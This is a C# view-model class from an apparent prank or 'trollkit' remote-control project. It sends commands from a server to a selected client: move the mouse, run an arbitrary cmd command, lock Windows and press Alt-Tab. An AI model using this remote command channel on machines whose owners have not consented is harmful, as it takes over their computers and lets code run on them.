using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;

namespace Trollkit_Library.ViewModels.Commands
{
    public class WindowsCommands
    {
		private Server _server;
		private string handler;

		//buttons
		public ICommand MousePosition { get { return new SendServerCommand(SendMousePosition); } }
		public ICommand Go { get { return new SendServerCommand(SendCMDCommand); } }
		public ICommand LockWindows { get { return new SendServerCommand(SendLockWindows); } }
		public ICommand AltTab { get { return new SendServerCommand(SendAltTab); } }

		//textboxes
		public string XCoordinate { get; set; }
		public string YCoordinate { get; set; }
		public string CommandText { get; set; }

		public WindowsCommands(Server server, string handler)
		{
			_server = server;
			this.handler = handler;

			XCoordinate = "0";
			YCoordinate = "0";
			CommandText = "show,color a & tree";
		}

		/// <summary>
		/// Sends the mouseposition command to the client.
		/// </summary>
        private void SendMousePosition()
        {
            TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = handler, Value = $"{XCoordinate},{YCoordinate}" };
            _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
        }

		/// <summary>
		/// Sends a cmd command to the client
		/// </summary>
        private void SendCMDCommand()
        {
            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = handler, Value = CommandText};
             _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
        }

		/// <summary>
		/// Sends a lock computer command to the client
		/// </summary>
        private void SendLockWindows()
        {
            TransferCommandObject returnObject = new TransferCommandObject { Command = "LockWindows", Handler = handler };
             _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
        }

		/// <summary>
		/// Send alt tab command to the client
		/// </summary>
        private void SendAltTab()
        {
            TransferCommandObject returnObject = new TransferCommandObject { Command = "AltTab", Handler = handler };
            _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
    }
    }
}
